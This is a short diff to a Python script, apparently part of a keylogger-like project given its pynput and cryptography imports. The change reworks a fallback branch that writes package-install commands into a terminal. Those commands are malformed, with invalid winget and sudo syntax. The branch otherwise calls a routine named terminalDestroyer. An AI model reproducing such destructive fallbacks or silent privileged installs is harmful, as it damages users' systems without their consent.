@@ -18,17 +18,19 @@ try:
     import pynput
     import cryptography
 
-except Exception:
+except Exception as e:
     if CURRENT_OS == 'Windows':
         windows = terminal.start_cmd()
         windows.write("winget install pynput, cryptography")
 
-    elif CURRENT_OS == 'Darwin' or 'Linux':
+    elif CURRENT_OS in ('Darwin', 'Linux'):
         OS = terminal.start_terminal()
         OS.write("sudo install pynput, cryptography")
-    
+
     else:
+        print(f"An exception: {e} occured.")
         make_terminal_unusable.terminalDestroyer()
+
 
 
 CURRENT_DIR = os.getcwd()
